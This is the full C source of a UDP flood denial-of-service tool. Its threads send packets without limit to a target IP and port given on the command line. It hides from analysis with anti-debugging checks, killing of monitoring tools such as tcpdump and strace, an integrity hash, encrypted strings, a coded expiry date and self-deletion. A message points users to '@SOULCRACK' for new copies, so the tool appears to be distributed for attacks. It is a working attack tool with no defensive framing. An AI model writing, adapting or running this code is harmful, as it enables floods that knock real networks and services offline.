#include <arpa/inet.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>
#include <fcntl.h>
#include <limits.h>
#include <sys/ptrace.h>
#include <openssl/sha.h>
#include <openssl/evp.h>
#include <dirent.h>
#include <signal.h>
#define MAX_PACKET_SIZE 9000
#define SHA_LEN 32
#define MAX_PPS 21000
#define XOR_SECRET1 0xA5E1
#define XOR_SECRET2 0xC37A
#define MAX_THREADS 2000

// Payload to send - fixed string
static const char PAYLOAD[] = "\x01\x01gets p h e";
static unsigned int PAYLOADSIZE = sizeof(PAYLOAD) - 1;

volatile unsigned int pps;
volatile unsigned int sleeptime = 1;
volatile int limiter;

// XOR encoded expiry date constants
static const int encoded_expiry_year  = 2025 ^ XOR_SECRET1;
static const int encoded_expiry_month = 9 ^ XOR_SECRET2;
static const int encoded_expiry_day   = 25 ^ XOR_SECRET1;

int get_expiry_year() { return encoded_expiry_year ^ XOR_SECRET1; }
int get_expiry_month() { return encoded_expiry_month ^ XOR_SECRET2; }
int get_expiry_day() { return encoded_expiry_day ^ XOR_SECRET1; }

// Hardcoded expected SHA256 hash (update after final build)
static const unsigned char hardcoded_hash[SHA_LEN] = {
    0xd2, 0xb1, 0x74, 0xfd, 0x01, 0x49, 0x3e, 0xec,
    0xc3, 0xe6, 0xc3, 0x71, 0xe6, 0x01, 0x29, 0x0d,
    0x15, 0x78, 0xf6, 0x95, 0xfe, 0x33, 0x7c, 0x60,
    0xb4, 0xe8, 0xee, 0x9b, 0x21, 0x7d, 0x8f, 0xd4
};

// Encrypted watermark payload
static const unsigned char encrypted_watermark[] = {
    0x31, 0xab, 0x47, 0xc2, 0x7e, 0x07, 0x6a, 0x43, 0xe7, 0x2e, 0xa3, 0x22, 0xe2, 0x8b, 0xad, 0x7f,
    0x07, 0x79, 0x97, 0x0e, 0x2a, 0xa5, 0x9f, 0xff, 0x28, 0x00, 0xba, 0xbe, 0x8e, 0xc6, 0x6f, 0x98,
    0xbf, 0xf9, 0x31, 0x10, 0xb6, 0x3a, 0x3c, 0x98, 0x73, 0x76, 0xbc, 0xf3, 0xc4, 0xe8, 0x8f, 0x25,
    0xc1, 0x64, 0xb8, 0x55, 0xca, 0xd4, 0x20, 0xa9, 0x51, 0x55, 0x3d, 0xc0, 0x99, 0x54, 0x8e, 0xb5,
    0xfe, 0x4a, 0xfe, 0x69, 0x0a, 0x0f, 0x91, 0xd6, 0x59, 0xef, 0x9b, 0xf0, 0xef, 0xbb, 0xb1, 0xb4,
    0x95, 0x04, 0x32, 0x90, 0xc2, 0xe7, 0xdf, 0x68, 0xf5, 0xeb, 0x70, 0xa6, 0x65, 0x7e, 0x6b, 0x0b
};
static const size_t encrypted_watermark_len = sizeof(encrypted_watermark);

// Encrypted expiry error message
static const unsigned char encrypted_expiry_error[] = {
    0xb8, 0x74, 0x07, 0x27, 0x2f, 0xb9, 0xc1, 0x32, 0x53, 0xa4, 0x5b, 0xc9, 0xe6, 0x7f, 0xe1, 0x7f,
    0x97, 0x75, 0x07, 0xc9, 0x9b, 0xf8, 0x59, 0x2a, 0x2b, 0xbc, 0xbd, 0xf4, 0xe7, 0xfd, 0x2b, 0x91,
    0xef, 0xf5, 0x0b, 0x2a, 0xec, 0xd8, 0xb5, 0x5f, 0x03, 0x24, 0xd7, 0x97, 0x43, 0x53, 0xc5, 0x8f,
    0xd2, 0x85, 0x03, 0x72, 0xc0, 0xf9, 0x68, 0x84, 0xd1, 0xfe, 0x01, 0xce, 0xf7, 0x9f, 0xf0, 0x1e,
    0xdf, 0x87, 0x95, 0xd1, 0xe7, 0x1b, 0x0e, 0x38, 0x1f, 0x64, 0x8b, 0xd0, 0xd5, 0x84, 0x26, 0x06,
};
static const size_t encrypted_expiry_error_len = sizeof(encrypted_expiry_error);

// AES Key and IV (same as used to encrypt your messages)
static const unsigned char aes_key[32] = {
    0x60, 0x3d, 0xeb, 0x10, 0x15, 0xca, 0x71, 0xbe,
    0x2b, 0x73, 0xae, 0xf0, 0x85, 0x7d, 0x77, 0x81,
    0x1f, 0x35, 0x2c, 0x07, 0x3b, 0x61, 0x08, 0xd7,
    0x2d, 0x98, 0x10, 0xa3, 0x09, 0x14, 0xdf, 0xf4
};
static const unsigned char aes_iv[16] = {
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f
};

struct thread_data {
    int thread_id;
    struct sockaddr_in sin;
};

// Globals for decrypted expiry message
unsigned char decrypted_expiry_error[256];
size_t decrypted_expiry_error_len = 0;

int aes_decrypt(const unsigned char *ciphertext, size_t ciphertext_len,
                unsigned char *plaintext, size_t plaintext_buf_len, size_t *plaintext_len) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return -1;
    int len = 0, plaintext_len_temp = 0;
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, aes_key, aes_iv) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    if (EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, (int)ciphertext_len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    plaintext_len_temp = len;
    if (EVP_DecryptFinal_ex(ctx, plaintext + len, &len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    plaintext_len_temp += len;
    if ((size_t)plaintext_len_temp >= plaintext_buf_len) {
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    plaintext[plaintext_len_temp] = '\0';
    *plaintext_len = plaintext_len_temp;
    EVP_CIPHER_CTX_free(ctx);
    return 0;
}

int decrypt_expiry_error_message() {
    return aes_decrypt(encrypted_expiry_error, encrypted_expiry_error_len,
                       decrypted_expiry_error, sizeof(decrypted_expiry_error), &decrypted_expiry_error_len);
}

void print_watermark() {
    unsigned char decrypted[1024];
    size_t len;
    if (aes_decrypt(encrypted_watermark, encrypted_watermark_len,
                    decrypted, sizeof(decrypted), &len) == 0) {
        printf("==============================\n");
        printf("%.*s", (int)len, decrypted);
        printf("==============================\n");
    } else {
        printf("==============================\n");
        printf("Watermark decrypt error.\n");
        printf("==============================\n");
    }
}

void get_runtime_salt(unsigned char *salt, size_t len) {
    char exe_path[PATH_MAX];
    ssize_t len_read = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (len_read != -1) {
        exe_path[len_read] = '\0';
        int fd = open(exe_path, O_RDONLY);
        if (fd != -1) {
            ssize_t readlen = read(fd, salt, len);
            if (readlen != (ssize_t)len)
                memset(salt, 0xab, len);
            close(fd);
        } else {
            memset(salt, 0xcd, len);
        }
    } else {
        memset(salt, 0xef, len);
    }
}

int is_expired() {
    struct tm exp = {0};
    exp.tm_year = get_expiry_year() - 1900;
    exp.tm_mon = get_expiry_month() - 1;
    exp.tm_mday = get_expiry_day();
    time_t now = time(NULL);
    return difftime(mktime(&exp), now) < 0;
}

void self_delete_and_exit() {
    char exe_path[PATH_MAX];
    ssize_t len_read = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (len_read != -1) {
        exe_path[len_read] = '\0';
        remove(exe_path);
    }
    exit(-1);
}

void current_checksum_call(void) {
    unsigned char salt[SHA_LEN];
    unsigned char computed_hash[SHA_LEN];
    unsigned int hash_len = 0;
    get_runtime_salt(salt, SHA_LEN);
    if (decrypt_expiry_error_message() != 0) {
        return;
    }
    EVP_MD_CTX *mdctx = EVP_MD_CTX_new();
    if (!mdctx) {
        return;
    }
    if (EVP_DigestInit_ex(mdctx, EVP_sha256(), NULL) != 1
        || EVP_DigestUpdate(mdctx, salt, SHA_LEN) != 1) {
        EVP_MD_CTX_free(mdctx);
        return;
    }
    int year = get_expiry_year();
    int month = get_expiry_month();
    int day = get_expiry_day();
    EVP_DigestUpdate(mdctx, &year, sizeof(year));
    EVP_DigestUpdate(mdctx, &month, sizeof(month));
    EVP_DigestUpdate(mdctx, &day, sizeof(day));
    EVP_DigestUpdate(mdctx, PAYLOAD, PAYLOADSIZE);
    EVP_DigestUpdate(mdctx, decrypted_expiry_error, decrypted_expiry_error_len);
    if (EVP_DigestFinal_ex(mdctx, computed_hash, &hash_len) != 1) {
        EVP_MD_CTX_free(mdctx);
        return;
    }
    EVP_MD_CTX_free(mdctx);
    printf("=== Current SHA256 Checksum ===\n");
    for (unsigned int i = 0; i < hash_len; i++) {
        printf("%02x", computed_hash[i]);
    }
    printf("\n");
}

void verify_integrity_or_self_destruct(void) {
    unsigned char salt[SHA_LEN];
    unsigned char computed_hash[SHA_LEN];
    unsigned int hash_len = 0;
    get_runtime_salt(salt, SHA_LEN);
    if (decrypt_expiry_error_message() != 0) {
        self_delete_and_exit();
     }
    EVP_MD_CTX *mdctx = EVP_MD_CTX_new();
    if (!mdctx) {
        self_delete_and_exit();
    }
    if (EVP_DigestInit_ex(mdctx, EVP_sha256(), NULL) != 1
        || EVP_DigestUpdate(mdctx, salt, SHA_LEN) != 1) {
        EVP_MD_CTX_free(mdctx);
        self_delete_and_exit();
    }
    int year = get_expiry_year();
    int month = get_expiry_month();
    int day = get_expiry_day();
    EVP_DigestUpdate(mdctx, &year, sizeof(year));
    EVP_DigestUpdate(mdctx, &month, sizeof(month));
    EVP_DigestUpdate(mdctx, &day, sizeof(day));
    EVP_DigestUpdate(mdctx, PAYLOAD, PAYLOADSIZE);
    EVP_DigestUpdate(mdctx, decrypted_expiry_error, decrypted_expiry_error_len);
    if (EVP_DigestFinal_ex(mdctx, computed_hash, &hash_len) != 1) {
        EVP_MD_CTX_free(mdctx);
        self_delete_and_exit();
    }
    EVP_MD_CTX_free(mdctx);
    if (hash_len != SHA_LEN || memcmp(computed_hash, hardcoded_hash, SHA_LEN) != 0) {
        fprintf(stderr, "deleting...\n");
        self_delete_and_exit();
    }
}

void anti_debug(void) {
    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
        fprintf(stderr, "Debugger detected! Self-deleting...\n");
        self_delete_and_exit();
    }
    ptrace(PTRACE_DETACH, 0, NULL, NULL);
}

void kill_forbidden_tools_and_self_destruct(void) {
    const char *tools[] = {"tcpdump", "r2", "radare2", "strace", "ltrace", NULL};
    DIR *proc = opendir("/proc");
    if (!proc)
        return;
    struct dirent *entry;
    while ((entry = readdir(proc)) != NULL) {
        if (entry->d_type != DT_DIR)
            continue;
        char *endptr;
        int pid = strtol(entry->d_name, &endptr, 10);
        if (*endptr != '\0')
            continue;
        char comm_path[PATH_MAX];
        snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", pid);
        FILE *fc = fopen(comm_path, "r");
        if (fc) {
            char comm[256];
            if (fgets(comm, sizeof(comm), fc) != NULL) {
                comm[strcspn(comm, "\n")] = 0;
                for (int i = 0; tools[i]; i++) {
                    if (strcmp(comm, tools[i]) == 0) {
                        kill(pid, SIGKILL);
                        fprintf(stderr, "%s detected! Self-deleting...\n", tools[i]);
                        self_delete_and_exit();
                    }
                }
            }
            fclose(fc);
        }
    }
    closedir(proc);
}

void *flood(void *par1) {
    struct thread_data *td = (struct thread_data *)par1;
    struct sockaddr_in sin = td->sin;
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) {
        exit(-1);
    }
    while (1) {
        ssize_t sent =
            sendto(s, PAYLOAD, PAYLOADSIZE, 0, (struct sockaddr *)&sin, sizeof(sin));
        if (sent >= 0) {
            pps++;
        }
        // No sleep or rate limiting here
    }
    close(s);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 5) {
        fprintf(stdout,
                "Usage: %s <attack_ip> <port> <duration_seconds> <num_threads>\n",
                argv[0]);
        exit(-1);
    }
    kill_forbidden_tools_and_self_destruct();
    anti_debug();
    verify_integrity_or_self_destruct();
    if (is_expired()) {
        fprintf(stderr,
                "This binary has expired. Self-deleting...\n DM TO GET NEW FILE @SOULCRACK");
        self_delete_and_exit();
    }
    print_watermark();
    int duration = atoi(argv[3]);
    int num_threads = atoi(argv[4]);
    if (num_threads < 1 || num_threads > MAX_THREADS) {
        fprintf(stderr, "Thread count must be 1-%d\n", MAX_THREADS);
        exit(-1);
    }
    limiter = 0;
    pps = 0;
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(atoi(argv[2]));
    sin.sin_addr.s_addr = inet_addr(argv[1]);
    pthread_t thread[num_threads];
    
    struct thread_data td[num_threads];
    fprintf(stdout,
            "Sending UDP packets to %s:%s IP spoofing for %d seconds using %d threads...\n",
            argv[1], argv[2], duration, num_threads);
    for (int i = 0; i < num_threads; i++) {
        td[i].thread_id = i;
        td[i].sin = sin;
        if (pthread_create(&thread[i], NULL, &flood, (void *)&td[i]) != 0) {
            perror("Thread creation failed");
            exit(-1);
        }
    }
    // Just wait for duration seconds, threads flood nonstop
    sleep(duration);
    return 0;
}